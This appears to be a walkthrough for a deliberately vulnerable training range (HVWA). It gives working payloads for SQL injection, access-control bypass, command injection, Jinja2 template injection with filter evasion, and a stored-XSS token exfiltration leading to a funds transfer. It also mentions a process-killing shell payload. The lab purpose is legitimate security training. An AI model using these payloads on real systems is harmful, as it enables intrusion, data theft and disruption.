# HVWA Range POC — Challenge Solving

Up to date: **2026-11-23**. This is the compact POC: **5 labs, 17 tiers**. Every lab is deliberately vulnerable.
The secure tier is called **Warded (Divine)**: it has no flag and pays no gold; it is the reference you compare
against with the portal's **View source** and **Diff** links.

| Lab | App | Flaw | Tiers | Lab version |
| --- | --- | --- | --- | --- |
| r01 The Clinic's Secret Ledger | Mercy Clinic | SQL injection | Acolyte · Templar · Inquisitor · Divine | 1.2.0 |
| r02 The Courier Never Asks | Courier | Broken access control | Acolyte · Templar · Inquisitor · Divine | 1.2.0 |
| r03 Whisper to the Watchtower | Beacon | Command injection | Acolyte · Templar · Inquisitor · Divine | 1.2.0 |
| r04 The Ink That Writes Back | Postcard | Server-side template injection | Acolyte · Templar · Inquisitor · Divine | 1.2.1 |
| r05 The Dragon Hoard Heist | Binanse | Stored XSS → session theft → transfer | Inquisitor only | 1.1.0 |

Threat names in the portal: **Common** (Acolyte), **Dangerous** (Templar), **Deadly** (Inquisitor), **Warded** (Divine).
Each tier is a separate instance with its own flag. Divine has no flag.

---

## 1. Getting into a lab

1. Open **https://hvwa.my.id** (or the local range at `http://localhost:18080`).
2. Register or sign in. The bounty board lists the five labs.
3. Open a bounty, pick a threat level, and press **Launch**. Wait until the panel says **Running**.
4. Press **Open lab**. The portal mints a single-use gate ticket and redirects to
   `https://i-<instance-id>.hvwa.my.id/`. The gate sets the host-only `hvwa_gate` cookie; every request to the lab
   needs it. If the first open returns Traefik's 404 for a second, press **Open lab** again — the ticket is not spent.
5. Exploit the app. The flag is `HVWA{` + 26 characters from `a-z2-7` + `}`.
6. Paste the flag into the claim box on the lab's dossier page. **Stop** (or let it idle out) when done;
   **Reset** gives a fresh instance with a fresh flag.

The reference solves live in `labs/<lab>/solve/<level>.mjs`. They take the lab base URL and run against the
instance network (`node solve/acolyte.mjs http://hvwa-i-<id>:<port>`). On a public instance, every request also needs
the gate cookie; the `poc:e2e` harness injects it. The solves print only the flag and exit quietly on a refusal.

### Flag hygiene

- Each tier has its own flag; the Acolyte flag does not work on Templar, and so on.
- Decoy flags are planted on purpose: HTML comments, response headers and decoy SQL rows. Submitting one is logged
  and answered with a mocking result. It never scores.
- Only the flag from the per-tier location below (and, for r05, the transfer receipt) is real.

---

## 2. r01 — Mercy Clinic (SQL injection)

The clinic's notice search builds a `LIKE` string by concatenation. The public notices and the staff notices share
the `notices` table; the staff rows are hidden by visibility.

### Acolyte — UNION the staff notice

Search endpoint: `GET /search?q=<payload>`.

```sql
') UNION SELECT id, title, body FROM notices WHERE visibility='staff' -- 
```

The search query has three columns (`id`, `title`, `body`), so the UNION lines up. The staff notice body is the flag.
The trailing `-- ` comments out the rest of the original query.

With curl:

```sh
curl -sG --data-urlencode "q=') UNION SELECT id, title, body FROM notices WHERE visibility='staff' -- " \
  https://<lab-host>/search
```

### Templar — a filter that removes the keyword once

The search removes the first `union` and the first `select` (case-insensitive) before concatenating, and the flag has
moved off the notice into a randomly named vault table. `vault_index` names that table and its column.

Nest each keyword inside itself so the single removal pass rebuilds it:

```sql
') ununionion selselectect id, table_name, column_name FROM vault_index -- 
```

The injected row shows the table name (`vault_<8 hex>`) and the column name. Read the payload from that table:

```sql
') ununionion selselectect 0, 'Vault', payload FROM vault_<8 hex> -- 
```

The `payload` column holds the flag. (If the index reports a different column name, use it in place of `payload`.)
The plain Acolyte payload loses `union`/`select` here and fails.

### Inquisitor — leak a service token, then the ledger

The query now selects four columns and the server renders only rows that claim to be public. The token is not a
notice, but it is still in the database: UNION it with a `public` visibility label.

```sql
') UNION SELECT 0,'Service token',token,'public' FROM staff_tokens -- 
```

The result renders the 32-hex service token. Use it to open the staff desk:

1. `GET /staff/notices?token=<token>` — the staff list names a ledger record.
2. `GET /staff/ledger/<id>?token=<token>` — the record body is the flag.

A three-column UNION is a SQL error against this four-column query, and the parameterised Warded search cannot leak
the token.

### Divine — the secure reference

The search is parameterised (`?` with bound values), so the query string can never change the SQL. The staff token
is not reachable through the search. Compare `levels/inquisitor.ts` and `levels/divine.ts` in View source.

---

## 3. r02 — Courier (broken access control)

The Courier portal has a demo customer session and per-parcel records. Your own parcels use the 2xxx block; the
vault's use 1xxx.

### Acolyte — read a foreign parcel

1. `POST /api/session` → `{ "token": "..." }`.
2. Send `Authorization: Bearer <token>` to `/api/parcels/<id>` and enumerate the 1xxx block.

The detail route does not check ownership, so a foreign parcel's private `note` is readable. The flag is in that note.
Own parcels are 2xxx, so 1000–1010 is enough in the POC.

```sh
curl -s -X POST https://<lab-host>/api/session
curl -s -H "Authorization: Bearer <token>" https://<lab-host>/api/parcels/1001
```

### Templar — the label route was forgotten

The detail route now returns 403 for a foreign parcel. The printable-label route is separate and still does not check
ownership:

`GET /api/parcels/<id>/label` with the demo Bearer → `{ "labelNote": "..." }`.

Enumerate 1000–1010. The detail `note` is a decoy here; the label copy of the vault parcel carries the flag.

### Inquisitor — support leaks the vault key

The support API answers any demo session with another customer's data:

`GET /api/support/customers/vault` with `Authorization: Bearer <token>` →
`{ "apiKey": "...", "parcels": [ ... ] }`.

Then read each vault parcel with **both** the demo Bearer and the stolen vault key:

`GET /api/parcels/<id>` with `Authorization: Bearer <token>` and `x-api-key: <apiKey>`.

The flag is in the parcel's `manifest`, not the note.

### Divine — the secure reference

The detail and label routes enforce ownership against the session's customer, and the support route only answers for
the customer it belongs to. The vault key is not returned to a demo session. There is no flag.

---

## 4. r03 — Beacon (command injection)

Beacon is a network appliance: a diagnostics form with a host field, a saved label, and a report generator.

### Acolyte — the host goes into `sh -c`

`POST /diagnostics` with form fields `host` and optional `label`. The host is concatenated into a real shell command.

```text
; cat /tmp/beacon/flag.txt #
```

The `;` ends the diagnostic command, `cat` reads the flag file, and `#` comments out the cosmetic ping. The response
contains the flag.

```sh
curl -s -X POST https://<lab-host>/diagnostics \
  --data-urlencode 'host=; cat /tmp/beacon/flag.txt #'
```

### Templar — the probe filter allows command substitution

The probe still blocks `;`, `&`, `|`, backticks and newlines, but `$(...)` is allowed. The old flag path is gone; the
flag is torn into a pair under `/tmp/beacon/spool`, beside decoy pairs.

1. List the spool: `host=$(ls /tmp/beacon/spool)`
2. Find the `part-1-<token>` / `part-2-<token>` names in the response.
3. Join a candidate pair: `host=$(cat /tmp/beacon/spool/part-1-<token> /tmp/beacon/spool/part-2-<token>)`
4. Keep the pair that forms a valid `HVWA{...}`; the others are decoys.

### Inquisitor — second-order injection through the saved label

The host is validated strictly and never reaches a shell. The free-text **label** is trusted: it is stored, and
`GET /diagnostics/report` interpolates the most recent saved label into

```sh
sh -c 'echo "<label>" >> /tmp/beacon/report.txt'
```

The flag is in a random pair under `/tmp/beacon/audit/<random>`, not at the Acolyte path.

1. `POST /diagnostics` with a valid host (e.g. `192.168.1.1`) and
   `label=$(ls -R /tmp/beacon/audit)`.
2. `GET /diagnostics/report` → the listing shows the audit directory and the `part-1-<token>` / `part-2-<token>` names.
3. Save another label:
   `label=$(cat /tmp/beacon/audit/<dir>/part-1-<token> /tmp/beacon/audit/<dir>/part-2-<token>)`.
4. `GET /diagnostics/report` again → the joined pair is the flag (decoy pairs do not form a flag).

### Divine — the secure reference

The host is validated against a strict allowlist and never reaches a shell; the label is escaped before it is written.
There is no command execution and no flag.

---

## 5. r04 — Postcard (server-side template injection)

Postcard renders a greeting card. The message is a Jinja2 template.

### Acolyte — direct template injection

`POST /preview` with form fields `style=Birthday` and `message=<template>`. The message is rendered as a template, and
the app has a Python file-read primitive through Flask's config globals:

```jinja2
{{ config.__class__.__init__.__globals__.os.popen('cat /tmp/postcard/flag.txt').read() }}
```

The card shows the flag (`HVWA{...}` contains no markup characters, so autoescaping leaves it intact).

### Templar — filter bypass, then the outbox

The press refuses the raw sequences `__`, and the words `os`, `popen`, `import`, `subprocess`, `eval`, `exec`. Build
every dunder from single underscores, and split blocked words and paths into pieces. The flag is torn into a pair
under `/tmp/postcard/outbox/`, beside decoy pairs.

List the outbox:

```jinja2
{% set d='_'~'_' %}{% set g=config|attr(d~'cla'~'ss'~d)|attr(d~'ini'~'t'~d)|attr(d~'glo'~'bals'~d) %}
{% set p='/tmp/p'~'o'~'stcard/outbox/' %}
{{ g['o'~'s'].listdir(p)|join(',') }}
```

Join a candidate pair:

```jinja2
{% set d='_'~'_' %}{% set g=config|attr(d~'cla'~'ss'~d)|attr(d~'ini'~'t'~d)|attr(d~'glo'~'bals'~d) %}
{% set p='/tmp/p'~'o'~'stcard/outbox/' %}
{{ g[d~'builtins'~d].open(p~'part-1-<token>').read() }}{{ g[d~'builtins'~d].open(p~'part-2-<token>').read() }}
```

`d` is `__`; `cla`+`ss` is `class`; `glo`+`bals` is `globals`; `o`+`s` is `os`; the path pieces avoid the banned
`os` inside “postcard”. Keep the pair that matches the flag shape.

### Inquisitor — second-order template injection

`/preview` no longer renders the saved message. It returns a draft id in `data-draft="..."` and a link to the print
stage. `GET /orders/<draft>/print` renders the saved message as a Jinja2 template (the second-order sink). The flag
lives in a random pair under `/tmp/postcard/archive/`.

Use the Acolyte payload, but send it through the print stage:

1. `POST /preview` with `message={{ config.__class__.__init__.__globals__.os.popen('ls -R /tmp/postcard/archive').read() }}`
   → read the draft id from `data-draft`.
2. `GET /orders/<draft>/print` → the listing shows the archive directory and pair names.
3. `POST /preview` with
   `message={{ config.__class__.__init__.__globals__.os.popen('cat <dir>/part-1-<token> <dir>/part-2-<token>').read() }}`
   → print that draft; keep the pair that forms the flag.

### Divine — the secure reference

The saved message is not evaluated as a template; user text is rendered as text. There is no file-read primitive and
no flag. The r04 image is **1.2.1** (its health check runs under gVisor); the tier content is unchanged.

---

## 6. r05 — Binanse (stored XSS → DevOps session theft → vault transfer)

Binanse is a fictional crypto exchange. There is **no seeded customer account**: register at `/register` first, then
`/login` works with those credentials. `/staff/login` is not a password form; it accepts the DevOps **session token**
that the stored XSS steals. This is the only Inquisitor-only lab (no Divine).

1. **Register and sign in** at `/register` (`username`, `password`). The dashboard shows your wallet address in
   `data-wallet="bn1..."`.
2. **Store a support ticket.** `POST /tickets` with `subject` and a raw `body`. The body is stored raw and escaped only
   in your own view. Payload:

   ```html
   <img src=x onerror="fetch('/api/attacker/inbox',{method:'POST',headers:{'content-type':'text/plain'},body:localStorage.getItem('bn_staff_token')})">
   ```

3. **Request staff review.** `POST /tickets/<id>/review`. The app runs the ticket body in a simulated DevOps browser.
   That browser holds `localStorage.bn_staff_token`.
4. **Read the attacker inbox.** `GET /attacker` lists the exfiltrated token (the public inbox).
5. **Staff sign in.** `POST /staff/login` with `token=<stolen token>`; it sets the HttpOnly `bn_staff` cookie.
6. **Read the withdrawal PIN.** `GET /staff/settings` → `data-pin="<6 digits>"`.
7. **Read the vault balance.** `GET /staff` → `data-vault-balance="..."`.
8. **Whitelist your wallet.** `POST /staff/whitelist` with `address=<your bn1 wallet>`.
9. **Transfer the vault.** `POST /staff/transfer` with `address`, `pin`, `amount` (the whole vault balance).
10. **Read the receipt.** The transfer response is the only page that contains the flag.

The reference solve `labs/r05-binanse/solve/inquisitor.mjs` performs all ten steps with a small cookie jar. It prints
the flag and exits quietly on a refusal.

---

## 7. Reference commands and gates

```sh
# The reference solves (instance network, no gate needed):
node labs/r01-mercy-clinic/solve/acolyte.mjs http://hvwa-i-<id>:8080
node labs/r02-courier/solve/templar.mjs   http://hvwa-i-<id>:8080
node labs/r03-beacon/solve/inquisitor.mjs http://hvwa-i-<id>:8080
node labs/r04-postcard/solve/inquisitor.mjs http://hvwa-i-<id>:5000
node labs/r05-binanse/solve/inquisitor.mjs http://hvwa-i-<id>:8080

# Full POC proof locally (needs Docker, runtime runc):
npm run poc:e2e

# Lab image behaviour, no range:
npm run labs:test
```

Public instances need the `hvwa_gate` cookie from the portal's Open lab redirect. The portal's Open ticket is
single-use; each request to the instance host needs the cookie. The lab itself may keep its own cookies (`bn_sid`,
`bn_staff`, demo sessions) — keep both.

### Tiers and the secure reference

- **Acolyte/Common, Templar/Dangerous, Inquisitor/Deadly**: exploitable, scored.
- **Divine/Warded**: the fixed app. No flag, no gold. Use View source and Diff to see exactly what changed;
  a payload that works on an exploitable tier must fail here.
- **r05** has one Inquisitor tier and no secure reference.

### If your payload kills the lab

Command injection and SSTI are real inside the lab, so a payload such as `$(pkill -9 node)` can kill the lab process.
The platform now auto-recovers a running lab: the old `i-<id>` host redirects to a friendly page (never a raw 404),
the reaper relaunches the same instance id with the same flag in about 11–43 seconds, and that page offers
**Try the lab again**. Your portal progress and flags persist; the lab's in-memory state resets. If it keeps dying
(more than 10 times in 10 minutes) the instance is failed and you relaunch it for a fresh flag. Nothing outside your
own gVisor container is affected.

### Current operational notes

- r04 is 1.2.1: its health check works under gVisor and the instance has 256 MiB.
- The production portal allows 40 concurrent labs; idle labs stop themselves after 20 minutes, hard limit 60 minutes.
- A flag is accepted only from the instance that issued it, within its day (the portal checks the instance’s flag).
- If a claim is answered “decoy”, you found a honeypot, not the real flag.

---

*This document covers the compact POC only (r01–r05, 17 tiers). The wider 122-challenge HVWA platform and its
districts are separate.*
